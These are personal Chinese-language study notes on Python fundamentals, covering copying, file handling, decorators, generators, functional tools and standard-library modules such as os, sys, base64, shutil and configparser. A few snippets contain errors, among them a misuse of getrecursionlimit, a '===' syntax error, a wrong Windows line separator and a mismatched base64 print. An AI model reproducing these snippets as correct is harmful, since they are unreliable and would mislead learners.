#### 深浅copy

```
直接赋值相等:
比如list1 = list2, 这是完全把list2的地址给了list1，两个指向到的同一个地址
浅copy:
如果是两层列表，那么第一层的列表id地址变化，第二层不变，这里就是指可变变量
深copy:
如果是两层列表，那么第一层的列表id地址变化，第二层也变化，这里就是指可变变量
```

###### 直接赋值

[![bxwpfP.png](https://s1.ax1x.com/2022/03/15/bxwpfP.png)](https://imgtu.com/i/bxwpfP)

###### 浅copy

这里list1[2]和list3[2]就是第二层列表id地址，发现他们相同

[![bxdzFI.png](https://s1.ax1x.com/2022/03/15/bxdzFI.png)](https://imgtu.com/i/bxdzFI)

###### 深copy

这里list1[2]和list3[2]就是第二层列表id地址，发现他们不相同

[![bxw5ng.png](https://s1.ax1x.com/2022/03/15/bxw5ng.png)](https://imgtu.com/i/bxw5ng)







![](https://z3.ax1x.com/2021/10/12/5m3vhq.png)

[![HW6SzR.jpg](https://s4.ax1x.com/2022/02/16/HW6SzR.jpg)](https://imgtu.com/i/HW6SzR)

内存固定使用unicode，和utf-8转换

当在内存时，字符都转换为unicode编码，在进入硬盘时，再再转换为utf-8编码

`#coding:gbk`

#### 文件操作

文件是操作系统提供给用户/应用程序操作硬盘的一种虚拟的概念/接口，用户/应用程序可以通过文件将数据永久

保存的硬盘中，即操作文件就是操作硬盘，用户/应用程序直接操作的是文件，对文件进行的所有的操作，都是

在向操作系统发送系统调用，然后再由操作将其转换成具体的硬盘操作



```python
f=open(r'aaa/a.txt',mode='rt') # f的值是一种变量，占用的是应用程序的内存空间
print(f)
# 2、操作文件：读/写文件，应用程序对文件的读写请求都是在向操作系统发送
# 系统调用，然后由操作系统控制硬盘把输入读入内存、或者写入硬盘
res=f.read()
print(type(res))
# print(res)
# 3、关闭文件
f.close() # 回收操作系统资源

# print(f)
# f.read() # 变量f存在，但是不能再读了

# del f     # 回收应用程序资源

# with是为了防止有人忘记close而来的					当一行太长时，可以用\换行
with open('a.txt',mode='rt') as f1: # f1=open('a.txt',mode='rt')
    res=f1.read()
    print(res)
```

```python
# 没有指定encoding参数操作系统会使用自己默认的编码
# linux系统默认utf-8
# windows系统默认gbk

当在windows上打开一个a.txt文件时，a.txt是以utf-8存进去的，在f.read()打开时，会把那一串二进制数进行gbk(操作系统默认)解码，当然会乱码，所以要用encoding="utf-8"，告诉操作系统要用utf-8解码，解码成功后再按照Unicode编码
with open('c.txt',mode='rt',encoding='utf-8') as f:
    res=f.read() # t模式会将f.read()读出的结果解码成unicode
    print(res,type(res))
    
r（默认的操作模式）：只读模式，当文件不存在时报错，当文件存在时文件指针跳到开始位置


w：只写模式，当文件不存在时会创建空文件，当文件存在会清空文件，指针位于开始位置
# 强调1
# 在以w模式打开文件没有关闭的情况下，连续写入，新的内容总是跟在旧的之后
with open('d.txt',mode='wt',encoding='utf-8') as f:
    f.write('擦勒1\n')
    f.write('擦勒2\n')
    f.write('擦勒3\n')
    
# 强调2
# 如果重新以w模式打开文件，则会清空文件内容
with open('d.txt',mode='wt',encoding='utf-8') as f:
    f.write('擦勒1\n')
with open('d.txt',mode='wt',encoding='utf-8') as f:
    f.write('擦勒2\n')
with open('d.txt',mode='wt',encoding='utf-8') as f:
    f.write('擦勒3\n')
    
a：只追加写，在文件不存在时会创建空文档，在文件存在时文件指针会直接调到末尾
x， 只写模式【不可读；不存在则创建，存在则报错】
with open('d.txt', mode='x', encoding='utf-8') as f:
    f.write('哈哈哈\n')
    
b：binary模式
    1、读写都是以bytes为单位
    2、可以针对所有文件
    3、一定不能指定字符编码，即一定不能指定encoding参数
    
总结：
1、在操作纯文本文件方面t模式帮我们省去了编码与解码的环节，b模式则需要手动编码与解码，所以此时t模式更为方便
2、针对非文本文件（如图片、视频、音频等）只能使用b模式
# 循环读取文件
for 和 while
更推荐while模式循环，因为自己控制每次读取的数据的数据量
with open(r'test.jpg',mode='rb') as f:
    while True:
        res=f.read(1024) # 1024
        if len(res) == 0:
            break
        print(len(res))
        
with open(r'g.txt',mode='rt',encoding='utf-8') as f:
    for line in f:
        print(len(line),line,end="")
```

##### 文件高级操作

###### 一：读相关操作

```python
# 1、readline：一次读一行
with open(r'g.txt',mode='rt',encoding='utf-8') as f:
    res1=f.readline()
    res2=f.readline()
    print(res2)

    while True:
        line=f.readline()
        if len(line) == 0:
            break
        print(line)

# 2、readlines：
with open(r'g.txt',mode='rt',encoding='utf-8') as f:
    res=f.readlines()
    print(res)
    
# 强调：
# f.read()与f.readlines()都是将内容一次性读入内存，如果内容过大会导致内存溢出，若还想将内容全读入内存
```

######  一：写相关操作

~~~python
# f.writelines()：						一次性把列表中的全写入
with open('h.txt',mode='wt',encoding='utf-8') as f:
    # f.write('1111\n222\n3333\n')

    # l=['11111\n','2222','3333',4444]
   l=['11111\n','2222','3333']
    # for line in l:
    #     f.write(line)
    f.writelines(l)
    
# 补充1：如果是纯英文字符，可以直接加前缀b得到bytes类型
    l = [
        b'1111aaa1\n',
        b'222bb2',
        b'33eee33'
    ]
# 补充2：'上'.encode('utf-8') 等同于bytes('上',encoding='utf-8')
    l = [
        bytes('上啊',encoding='utf-8'),
        bytes('冲呀',encoding='utf-8'),
        bytes('小垃圾们',encoding='utf-8'),
    ]
    f.writelines(l)
# 3、flush：              立即把当前内存中的内容强制写入硬盘！！！
with open('h.txt', mode='wt',encoding='utf-8') as f:
    f.write('哈')
    # f.flush()
# 4、了解              
with open('h.txt', mode='wt', encoding='utf-8') as f:
    print(f.readable())               #是否可读
    print(f.writable())               #是否可写
    print(f.encoding)                 #编码
    print(f.name)                     #名字
~~~

###### 文件指针移动

~~~python
# 指针移动的单位都是以bytes/字节为单位
# 只有一种情况特殊：
#       t模式下的read(n),n代表的是字符个数
~~~

~~~python
#f.seek(n,模式):n指的是移动的字节个数
模式：
#模式0：参照物是文件开头位置
f.seek(9,0)
f.seek(3,0) # 3

#模式1：参照物是当前指针所在位置
f.seek(9,1)
f.seek(3,1) # 12

#模式2：参照物是文件末尾位置，应该倒着移动
f.seek(-9,2) # 3
f.seek(-3,2) # 9

# 强调：只有0模式可以在t下使用，1、2必须在b模式下用
# f.tell() # 获取文件指针当前位置
~~~

###### 文件修改两种方式

```python
# 方式一：文本编辑采用的就是这种方式
# 实现思路：将文件内容发一次性全部读入内存,然后在内存中修改完毕后再覆盖写回原文件
# 优点: 在文件修改过程中同一份数据只有一份
# 缺点: 会过多地占用内存
with open('c.txt',mode='rt',encoding='utf-8') as f:
    res=f.read()
    data=res.replace('alex','dsb')
    print(data)

with open('c.txt',mode='wt',encoding='utf-8') as f1:
    f1.write(data)
```

~~~python
# 方式二：
import os
# 实现思路：以读的方式打开原文件,以写的方式打开一个临时文件,一行行读取原文件内容,修改完后写入临时文件...,删掉原文件,将临时文件重命名原文件名
# 优点: 不会占用过多的内存
# 缺点: 在文件修改过程中同一份数据存了两份
with open('c.txt', mode='rt', encoding='utf-8') as f, \
        open('.c.txt.swap', mode='wt', encoding='utf-8') as f1:
    for line in f:
        f1.write(line.replace('alex', 'dsb'))

os.remove('c.txt')
os.rename('.c.txt.swap', 'c.txt')
~~~



##### 闭包函数

~~~python
闭包函数=名称空间与作用域+函数嵌套+函数对象
核心点：名字的查找关系是以函数定义阶段为准

# "闭"函数指的该函数是内嵌函数
# "包"函数指的该函数包含对外层函数作用域名字的引用（不是对全局作用域）

# 闭包函数：函数对象
def f1():
    x = 33333333333333333333
    def f2():
        print('函数f2：',x)
    return f2

f=f1()
print(f)
~~~

#### 装饰器(无参)

```
什么是装饰器：装饰器指的定义一个函数，该函数是用来为其他函数添加额外的功能
为何要用装饰器：开放封闭原则
        开放：指的是对拓展功能是开放的
        封闭：指的是对修改源代码是封闭的
装饰器就是在不修改被装饰器对象源代码以及调用方式的前提下为被装饰对象添加新功能
```

~~~python
import time

def index(name,age,power):
    time.sleep(2)
    print("my name is %s,and my age is %s,my superpower is %s" %(name,age,power))
    return 123456

def outter(func):
    def wrapper(*args,**kwargs):
        start = time.time()
        msg = func(*args,**kwargs)
        stop = time.time()
        print(stop - start)
        return msg
    return wrapper

index = outter(index)	#  这里outter(index)中的index是指调用的函数名字，返回值是wrapper闭包函数

res = index('batmanfuture','11','123456')	#  这里引用闭包函数传入的值就是我们要调的函数的值

print("返回值res = %s" %res)

# 这里需要满足开放和封闭的原则
~~~

##### 语法糖

~~~python
# 在被装饰对象正上方的单独一行写@装饰器名字
def timmer(func):
    def wrapper(*args,**kwargs):
        start = time.time()
        msg = func(*args,**kwargs)
        stop = time.time()
        print(stop - start)
        return msg
    return wrapper

@timmer # index=timmer(index)
def index(x,y,z):
    time.sleep(3)
    print('index %s %s %s' %(x,y,z))

@timmer # home=timmer(ome)
def home(name):
    time.sleep(2)
    print('welcome %s to home page' %name)


index(x=1,y=2,z=3)
home('egon')


@property是Python中的一个装饰器，可以将一个类方法转换为类属性


class MyClass:
    def __init__(self, my_var):
        self._my_var = my_var
    
    @property
    def my_var(self):
        return self._my_var
    
    @my_var.setter
    def my_var(self, value):
        if isinstance(value, int):
            self._my_var = value
        else:
            raise ValueError("my_var must be an integer")
obj = MyClass(10)

print(obj.my_var)  # 输出 10

# 设置新的值
obj.my_var = 20

print(obj.my_var)  # 输出 20

# 尝试设置非整数值，会抛出异常
try:
    obj.my_var = "abc"
except ValueError as e:
    print(str(e))  # 输出 "my_var must be an integer"
~~~



#### 装饰器(有参)

~~~python
    # 1、函数wrapper.__name__ = 原函数.__name__
    # 2、函数wrapper.__doc__ = 原函数.__doc__

from functools import wraps		#	即将原函数名指向的内存地址偷梁换柱成wrapper函数,所以应该将wrapper做的跟原函数一样才行

def outter(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        """这个是主页功能"""
        res = func(*args, **kwargs) # res=index(1,2)
        return res

    # 手动将原函数的属性赋值给wrapper函数
    # 1、函数wrapper.__name__ = 原函数.__name__
    # 2、函数wrapper.__doc__ = 原函数.__doc__
    # wrapper.__name__ = func.__name__
    # wrapper.__doc__ = func.__doc__

    return wrapper  
~~~

~~~python
# 由于语法糖@的限制，outter函数只能有一个参数，并且该才是只用来接收被装饰对象的内存地址
def auth(db_type):
    def deco(func):
        def wrapper(*args, **kwargs):
            name = input('your name>>>: ').strip()
            pwd = input('your password>>>: ').strip()

            if db_type == 'file':
                print('基于文件的验证')
                if name == 'egon' and pwd == '123':
                    res = func(*args, **kwargs)  # index(1,2)
                    return res
                else:
                    print('user or password error')
            elif db_type == 'mysql':
                print('基于mysql的验证')
            elif db_type == 'ldap':
                print('基于ldap的验证')
            else:
                print('不支持该db_type')
        return wrapper
    return deco


@auth(db_type='file')  # @deco # index=deco(index) # index=wrapper
def index(x, y):
    print('index->>%s:%s' % (x, y))

@auth(db_type='mysql')  # @deco # home=deco(home) # home=wrapper
def home(name):
    print('home->>%s' % name)


@auth(db_type='ldap')  # 账号密码的来源是ldap
def transfer():
    print('transfer')
~~~

有参装饰器，在本来的两层之外又多一层用来传递变量，利用语法糖



#### 迭代器

~~~python
迭代器指的是迭代取值的工具，迭代是一个重复的过程，每次重复
    都是基于上一次的结果而继续的，单纯的重复并不是迭代
    
迭代器是用来迭代取值的工具，而涉及到把多个值循环取出来的类型
    有：列表、字符串、元组、字典、集合、打开文件
迭代器对象有：文件类型
    
可迭代的对象：但凡内置有__iter__方法的都称之为可迭代的对象
d={'a':1,'b':2,'c':3}
d_iterator=d.__iter__()
print(d_iterator)

print(d_iterator.__next__())		# 内置有__next__方法并且内置有__iter__方法的对象是迭代器对象
print(d_iterator.__next__())
print(d_iterator.__next__())
print(d_iterator.__next__()) # 抛出异常StopIteration

while True:
    try:
        print(d_iterator.__next__())
    except StopIteration:	# 抛出异常StopIteration
        break
# 在一个迭代器取值取干净的情况下，再对其取值取不到

3.2 迭代器对象：内置有__next__方法并且内置有__iter__方法的对象
       迭代器对象.__next__（）：得到迭代器的下一个值
       迭代器对象.__iter__（）：得到迭代器的本身，说白了调了跟没调一个样子
~~~

##### for循环本质

~~~python
d={'a':1,'b':2,'c':3}

#	1、d.__iter__()得到一个迭代器对象
#	2、迭代器对象.__next__()拿到一个返回值，然后将该返回值赋值给k
#	3、循环往复步骤2，直到抛出StopIteration异常for循环会捕捉异常然后结束循环
for k in d:
    print(k)
~~~

#### 生成器-自定义的迭代器

~~~python
如何得到自定义的迭代器：
# 在函数内一旦存在yield关键字，调用函数并不会执行函数体代码
# 会返回一个生成器对象，生成器即自定义的迭代器

# 会触发函数体代码的运行，然后遇到yield停下来，将yield后的值
# 当做本次调用的结果返回


~~~

##### 叠加多个装饰器分析

~~~python
# 加载顺序自下而上(了解)
@deco1      # index=deco1(wrapper2的内存地址)        ===> index=wrapper1的内存地址
@deco2      # index=deco2(wrapper3的内存地址)        ===> index=wrapper2的内存地址
@deco3(111) # ===>@outter3===> index=outter3(index) ===> index=wrapper3的内存地址
def index(x,y):
    print('from index %s:%s' %(x,y))

# 执行顺序自上而下的，即wraper1-》wrapper2-》wrapper3
index(1,2) # wrapper1(1,2)

e45e329feb5d925b
a3f549b17b4b3dde
~~~

##### yield

~~~python
def dog(name):
    print('道哥%s准备吃东西啦...' %name)
    while True:
        # x拿到的是yield接收到的值
        x = yield # x = '肉包子'
        print('道哥%s吃了 %s' %(name,x))


g=dog('alex')
g.send(None) # 等同于next(g)
~~~

~~~python
def dog(name):
    print('道哥%s准备吃东西啦...' %name)
    while True:
        # x拿到的是yield接收到的值
        x = yield # x = '肉包子'
        print('道哥%s吃了 %s' %(name,x))


g=dog('alex')
g.send(None) # 等同于next(g)

g.send(['一根骨头','aaa'])
# g.send('肉包子')
# g.send('一同泔水')
# g.close()
# g.send('1111') # 关闭之后无法传值
~~~

##### 三元表达式

~~~python
def func(x,y):
    if x > y:
        return x
    else:
        return y

res=func(1,2)
print(res)
----------------------
res=x if x > y else y
print(res)
~~~

##### 列表生成式

~~~python
l = ['alex_dsb', 'lxx_dsb', 'wxx_dsb', "xxq_dsb", 'egon']
new_l=[]
for name in l:
    if name.endswith('dsb'):
        new_l.append(name)
-------------------------------------
l = ['alex_dsb', 'lxx_dsb', 'wxx_dsb', "xxq_dsb", 'egon']
new_l=[name for name in l if name.endswith('dsb')]
~~~

##### 函数的递归调用

> 函数的递归调用：是函数嵌套调用的一种特殊形式，在调用一个函数的过程中又直接或者间接地调用到本身
>
> 死循环不会无限申请内存

~~~python
import sys		# 查看最大可递归调用的次数
sys.getrecursionlimit()

import sys		# 设置最多可递归的次数为2000
sys.getrecursionlimit(2000)	

递归调用不应该无限地调用下去，必须在满足某种条件下结束递归调用

# 回溯：一层一层调用下去
# 递推：满足某种结束条件，结束递归调用，然后一层一层返回
~~~

##### 二分法

[![becYIP.png](https://s4.ax1x.com/2022/02/27/becYIP.png)](https://imgtu.com/i/becYIP)

##### 匿名函数

~~~python
#	调用匿名函数
res=(lambda x,y:x+y)(1,2)
print(res)
匿名用于临时调用一次的场景：更多的是将匿名与其他函数配合使用

res=max(salaries,key=lambda k:salaries[k])
print(res)

res=min(salaries,key=lambda k:salaries[k])
print(res)
~~~

##### sorted

~~~python
salaries={
    'siry':3000,
    'tom':7000,
    'lili':10000,
    'jack':2000
}
res=sorted(salaries,key=lambda k:salaries[k],reverse=True)
print(res)
~~~

##### map

~~~python
l=['alex','lxx','wxx','薛贤妻']
new_l=(name+'_dsb' for name in l)
print(new_l)

res=map(lambda name:name+'_dsb',l)
print(res) # 生成器
~~~

##### filter

~~~python
#	filter会留下结果为True的
l=['alex_sb','lxx_sb','wxx','薛贤妻']
res=(name for name in l if name.endswith('sb'))
print(res)

res=filter(lambda name:name.endswith('sb'),l)
print(res)
~~~

##### reduce

~~~python
from functools import reduce
res=reduce(lambda x,y:x+y,[1,2,3],10) # 16
print(res)

res=reduce(lambda x,y:x+y,['a','b','c']) # 'a','b'
print(res)
~~~

##### 模块和包

~~~python
一个python文件本身就一个模块，文件名m.py，模块名叫m，模块有四种形式：
1 使用python编写的.py文件
2 已被编译为共享库或DLL的C或C++扩展
3 把一系列模块组织到一起的文件夹（注：文件夹下有一个__init__.py文件，该文件夹称之为包）
4 使用C编写并链接到python解释器的内置模块

I:内置与第三的模块拿来就用，无需定义，这种拿来主义，可以极大地提升自己的开发效率
II:自定义的模块
    可以将程序的各部分功能提取出来放到一模块中为大家共享使用
    好处是减少了代码冗余，程序组织结构更加清晰

# 一个python文件有两种用途
# 1、被当成程序运行
# 2、被当做模块导入

#1、产生一个名称空间
#2、运行包下的__init__.py文件，将运行过程中产生的名字都丢到1的名称空间中
#3、在当前执行文件的名称空间中拿到一个名字mmm，mmm指向1的名称空间

在导入时带.，左边必须是包
from foo.m1 import f1

绝对导入和相对导入
绝对导入前，可以把模块的路径添加到内存环境变量中
相对导入：
from .m1 import f1	#	这里.m1表示在当前路径下找m1
from ..m2 import f1	#	这里..m2表示在上一级目录下找m2

包内之间互相导入推荐相对导入

~~~

###### name

~~~python
当文件运行时__name__ == '__main__'
当文件被当成模块时，__name__ == 模块名

if __name__ === '__main__':
  	print('文件被执行')
    get()
    change()
else:
  print("文件被导入")
  pass
~~~

###### from ... import ...

~~~python
# import导入模块在使用时必须加前缀"模块."
# 优点：肯定不会与当前名称空间中的名字冲突
# 缺点：加前缀显得麻烦

# from ... import ...导入也发生了三件事
# 1、产一个模块的名称空间
# 2、运行foo.py将运行过程中产生的名字都丢到模块的名称空间去
# 3、在当前名称空间拿到一个名字，该名字与模块名称空间中的某一个内存地址

多次导入，全部导入，起别名
from socket import foo,pass,test
from socket import *
from socket import xxx as f

被导入模块内部存在一个__all__的列表,列表内部的值是模块内部的名字
__all__ = ['x','get','change']
~~~

###### 优先级

~~~python
# 无论是import还是from...import在导入模块时都涉及到查找问题
# 优先级：
# 1、内存（内置模块）
# 2、硬盘：按照sys.path中存放的文件的顺序依次查找要导入的模块

import sys
#值为一个列表，存放了一系列的对文件夹
#其中第一个文件夹是当前执行文件所在的文件夹
print(sys.path)

#	sys.modules查看已经加载到内存中的模块
import sys
import foo # foo=模块的内存地址
print('foo' in sys.modules)
print(sys.modules)

# sys.path应用
#	找foo.py就把foo.py的文件夹添加到环境变量中
import sys
sys.path.append(r"/users/linhaifeng/PycharmProjects/aa")
~~~

##### 编程语言的三种划分方式：

###### 编译型和解释型

主要区别在于，前者源程序编译后即可在该平台运行，后者是在运行期间才编译。所以前者运行速度快，后者跨平台性好

--------编译型总结

1.一次性的编译成平台相关的机器语言文件，运行时脱离开发环境，运行效率高；

2.与特定平台相关，一般无法移植到其他平台；

3.现有的C、C++、Objective等都属于编译型语言。

--------解释型总结

1.解释型语言每次运行都需要将源代码解释称机器码并执行，效率较低；

2.只要平台提供相应的解释器，就可以运行源代码，所以可以方便源程序移植；

3.Python等属于解释型语言。

###### 强类型和弱类型

强类型的数据类型不可以被忽视，一旦被定义不会改变除非强行转换。弱类型的数据类型可以被忽视，比如php的弱类型比较

###### 动态型和静态型

动态型在运行时才进行数据类型检查；静态型事先给变量进行数据类型的定义

-----------------------------------------------------------------------------------------------------------------------------------------------------------

python是解释型强类型动态型

##### 函数的类型提示

~~~python
#	:后门跟的是提示信息

def register(name:str,age:int,hobbbies:tuple)->int:	#	返回的是整型
   print(name)
   print(age)
   print(hobbbies)
   return 111
~~~

#### 软件开发目录规范

~~~python
conf	配置文件
bin		可执行文件
db		数据库相关操作
core	核心逻辑
api		api接口
lib		存放自定义模块
README.md	解释说明
~~~

##### time模块

~~~python
time.sleep(3)
# 时间分为三种格式：
# 1、时间戳：从1970年到现在经过的秒数
#    作用：用于时间间隔的计算
print(time.time())

# 2、按照某种格式显示的时间：2020-03-30 11:11:11
#    作用：用于展示时间

print(time.strftime('%Y-%m-%d %H:%M:%S %p'))
print(time.strftime('%Y-%m-%d %X'))

# 3、结构化的时间
#    作用：用于单独获取时间的某一部分

res=time.localtime()
print(res)
print(res.tm_year)
print(res.tm_yday)

~~~

##### datatime模块

~~~python
#	一步到位得到显示出的格式化时间
import datetime

print(datetime.datetime.now())
print(datetime.datetime.now() + datetime.timedelta(days=3))
print(datetime.datetime.now() + datetime.timedelta(weeks=1))
~~~

![](https://s4.ax1x.com/2022/02/27/bm1JxS.png)

~~~python
import time
s_time=time.localtime()
print(time.mktime(s_time))

tp_time=time.time()
print(time.localtime(tp_time))

print(time.localtime())
print(time.gmtime()) # 世界标准时间，了解
print(time.localtime(333333333))
print(time.gmtime(333333333))

s_time=time.localtime()
print(time.strftime('%Y-%m-%d %H:%M:%S',s_time))
~~~

##### random模块

~~~python
import random
print(random.random())#(0,1)----float    大于0且小于1之间的小数
print(random.randint(1,3))  #[1,3]    大于等于1且小于等于3之间的整数
print(random.randrange(1,3)) #[1,3)    大于等于1且小于3之间的整数
print(random.choice([1,'23',[4,5]]))#1或者23或者[4,5]
print(random.sample([1,'23',[4,5]],2))#列表元素任意2个组合
print(random.uniform(1,3))#大于1小于3的小数，如1.927109612082716 

item=[1,3,5,7,9]
random.shuffle(item) #打乱item的顺序,相当于"洗牌"
print(item)

------------------
随机验证码
import random
def make_code(n):
    res=''
    for i in range(n):
        s1=chr(random.randint(65,90))
        s2=str(random.randint(0,9))
        res+=random.choice([s1,s2])
    return res

print(make_code(9))
~~~

##### glob模块





##### os模块

~~~python
os.getcwd() 获取当前工作目录，即当前python脚本工作的目录路径
os.chdir("dirname")  改变当前脚本工作目录；相当于shell下cd
os.curdir  返回当前目录: ('.')
os.pardir  获取当前目录的父目录字符串名：('..')
os.makedirs('dirname1/dirname2')    可生成多层递归目录
os.removedirs('dirname1')    若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推
os.mkdir('dirname')    生成单级目录；相当于shell中mkdir dirname
os.rmdir('dirname')    删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname
os.listdir('dirname')    列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印
os.remove()  删除一个文件
os.rename("oldname","newname")  重命名文件/目录
os.stat('path/filename')  获取文件/目录信息
os.sep    输出操作系统特定的路径分隔符，win下为"\\",Linux下为"/"
os.linesep    输出当前平台使用的行终止符，win下为"\t\n",Linux下为"\n"
os.pathsep    输出用于分割文件路径的字符串 win下为;,Linux下为:
os.name    输出字符串指示当前使用平台。win->'nt'; Linux->'posix'
os.system("bash command")  运行shell命令，直接显示
os.environ  获取系统环境变量
os.path.abspath(path)  返回path规范化的绝对路径
os.path.split(path)  将path分割成目录和文件名二元组返回
os.path.dirname(path)  返回path的目录。其实就是os.path.split(path)的第一个元素
os.path.basename(path)  返回path最后的文件名。如何path以／或\结尾，那么就会返回空值。即os.path.split(path)的第二个元素
os.path.exists(path)  如果path存在，返回True；如果path不存在，返回False
os.path.isabs(path)  如果path是绝对路径，返回True
os.path.isfile(path)  如果path是一个存在的文件，返回True。否则返回False
os.path.isdir(path)  如果path是一个存在的目录，则返回True。否则返回False
os.path.join(path1[, path2[, ...]])  将多个路径组合后返回，第一个绝对路径之前的参数将被忽略
os.path.getatime(path)  返回path所指向的文件或者目录的最后存取时间
os.path.getmtime(path)  返回path所指向的文件或者目录的最后修改时间
os.path.getsize(path) 返回path的大小
~~~

##### sys模块

针对python解释器相关变量和方法

~~~python
# 版本号
print(sys.version)
# 最大表示int数值
print(sys.maxsize)
# 查看python代码模块
print(sys.path)
# 查看平台
print(sys.platform)
# 查看版权
print(sys.copyright)
# 查看参数
print(sys.argv)
# 退出码
print(sys.exit(1))
# 查看默认编码
print(sys.getdefaultencoding())
# 查看文件编码
print(sys.getfilesystemencoding())
# 最大递归次数
print(sys.getrecursionlimit())
sys.argv           #命令行参数List，第一个元素是程序本身路径
sys.exit(n)        #退出程序，正常退出时exit(0)
sys.version        #获取Python解释程序的版本信息
sys.maxint       #  最大的Int值
sys.path           #返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值
sys.platform       #返回操作系统平台名称
sys.stdin          #输入相关
sys.stdout         #输出相关
sys.stderror       #错误相关
~~~

##### base64模块

常见于ctf题目或者爬虫中url中base64的转换

~~~python
# 想将字符串转编码成base64,要先将字符串转换成二进制数据
import base64
url = "https://www.cnblogs.com/songzhixue/"
bytes_url = url.encode("utf-8")
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(bytes_url)

# b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
-------------------------------------------------------------------------------------------------
# 将base64解码成字符串
import base64
url = "aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8="
str_url = base64.b64decode(url).decode("utf-8")
print(str_url)

# 'https://www.cnblogs.com/songzhixue/'
~~~

##### 打印进度条

~~~python
'[%-50s]'	# 这里%s是替代的字符，比如■或者#，- 是左对齐

import time

for i in range(1,51):
    time.sleep(0.2)
    msg = '\r[%-50s]' % ('■' * i)
    print(msg,end='')
#	这里\r是每次打印都跳到行首
------------------------------------------------------------------------
import time


def progress(percent):
    if percent > 1:
        percent = 1
    res = int(50 * percent) * '■'
    print('\r[%-50s] %d%%' % (res, int(100 * percent)), end='')

recv_size=0
total_size=1025011

while recv_size < total_size:
    time.sleep(0.001) # 下载了1024个字节的数据

    recv_size+=1024 # recv_size=2048

    # 打印进度条
    # print(recv_size)
    percent = recv_size / total_size  # 1024 / 333333
    progress(percent)

~~~

##### shutil模块

~~~python
shutil.copyfileobj(fsrc, fdst[, length])
将文件内容拷贝到另一个文件中

1 import shutil
2  
3 shutil.copyfileobj(open('old.xml','r'), open('new.xml', 'w'))
 

shutil.copyfile(src, dst)
拷贝文件

1 shutil.copyfile('f1.log', 'f2.log') #目标文件无需存在
shutil.copymode(src, dst)
仅拷贝权限。内容、组、用户均不变

1 shutil.copymode('f1.log', 'f2.log') #目标文件必须存在
 

shutil.copystat(src, dst)
仅拷贝状态的信息，包括：mode bits, atime, mtime, flags

1 shutil.copystat('f1.log', 'f2.log') #目标文件必须存在
 

shutil.copy(src, dst)
拷贝文件和权限

1 import shutil
2  
3 shutil.copy('f1.log', 'f2.log')
 

shutil.copy2(src, dst)
拷贝文件和状态信息

1 import shutil
2  
3 shutil.copy2('f1.log', 'f2.log')
 

shutil.ignore_patterns(*patterns)
shutil.copytree(src, dst, symlinks=False, ignore=None)
递归的去拷贝文件夹

1 import shutil
2  
3 shutil.copytree('folder1', 'folder2', ignore=shutil.ignore_patterns('*.pyc', 'tmp*')) #目标目录不能存在，注意对folder2目录父级目录要有可写权限，ignore的意思是排除 
 拷贝软连接
 

shutil.rmtree(path[, ignore_errors[, onerror]])
递归的去删除文件

1 import shutil
2  
3 shutil.rmtree('folder1')
 

shutil.move(src, dst)
递归的去移动文件，它类似mv命令，其实就是重命名。

1 import shutil
2  
3 shutil.move('folder1', 'folder3')
 

shutil.make_archive(base_name, format,...)

创建压缩包并返回文件路径，例如：zip、tar

创建压缩包并返回文件路径，例如：zip、tar

base_name： 压缩包的文件名，也可以是压缩包的路径。只是文件名时，则保存至当前目录，否则保存至指定路径，
如 data_bak                       =>保存至当前路径
如：/tmp/data_bak =>保存至/tmp/
format： 压缩包种类，“zip”, “tar”, “bztar”，“gztar”
root_dir： 要压缩的文件夹路径（默认当前目录）
owner： 用户，默认当前用户
group： 组，默认当前组
logger： 用于记录日志，通常是logging.Logger对象
1 #将 /data 下的文件打包放置当前程序目录
2 import shutil
3 ret = shutil.make_archive("data_bak", 'gztar', root_dir='/data')
4   
5   
6 #将 /data下的文件打包放置 /tmp/目录
7 import shutil
8 ret = shutil.make_archive("/tmp/data_bak", 'gztar', root_dir='/data') 
~~~

##### pickle，json，shelve

见python的序列化和反序列化文章

##### configparser

配置文件如下

~~~python
# 注释1
; 注释2

[section1]
k1 = v1
k2:v2
user=egon
age=18
is_admin=true
salary=31

[section2]
k1 = v1
~~~

###### 读取

~~~python
import configparser

config=configparser.ConfigParser()
config.read('a.cfg')

#查看所有的标题
res=config.sections() #['section1', 'section2']
print(res)

#查看标题section1下所有key=value的key
options=config.options('section1')
print(options) #['k1', 'k2', 'user', 'age', 'is_admin', 'salary']

#查看标题section1下所有key=value的(key,value)格式
item_list=config.items('section1')
print(item_list) #[('k1', 'v1'), ('k2', 'v2'), ('user', 'egon'), ('age', '18'), ('is_admin', 'true'), ('salary', '31')]

#查看标题section1下user的值=>字符串格式
val=config.get('section1','user')
print(val) #egon

#查看标题section1下age的值=>整数格式
val1=config.getint('section1','age')
print(val1) #18

#查看标题section1下is_admin的值=>布尔值格式
val2=config.getboolean('section1','is_admin')
print(val2) #True

#查看标题section1下salary的值=>浮点型格式
val3=config.getfloat('section1','salary')
print(val3) #31.0
~~~

###### 改写

~~~python
import configparser

config=configparser.ConfigParser()
config.read('a.cfg',encoding='utf-8')


#删除整个标题section2
config.remove_section('section2')

#删除标题section1下的某个k1和k2
config.remove_option('section1','k1')
config.remove_option('section1','k2')

#判断是否存在某个标题
print(config.has_section('section1'))

#判断标题section1下是否有user
print(config.has_option('section1',''))


#添加一个标题
config.add_section('egon')

#在标题egon下添加name=egon,age=18的配置
config.set('egon','name','egon')
config.set('egon','age',18) #报错,必须是字符串


#最后将修改的内容写入文件,完成最终的修改
config.write(open('a.cfg','w'))
~~~

#### hash

hash算法就像一座工厂，工厂接收你送来的原材料（可以用m.update()为工厂运送原材料），经过加工返回的产品就是hash值

[![bdWGb8.png](https://s4.ax1x.com/2022/03/05/bdWGb8.png)](https://imgtu.com/i/bdWGb8)

~~~python
import hashlib
m=hashlib.md5()# m=hashlib.sha256()
m.update('hello'.encode('utf8'))
print(m.hexdigest())  #5d41402abc4b2a76b9719d911017c592
m.update('alvin'.encode('utf8'))
print(m.hexdigest())  #92a7e713c30abbb0319fa07da2a5c4af
m2=hashlib.md5()
m2.update('helloalvin'.encode('utf8'))
print(m2.hexdigest()) #92a7e713c30abbb0319fa07da2a5c4af
'''
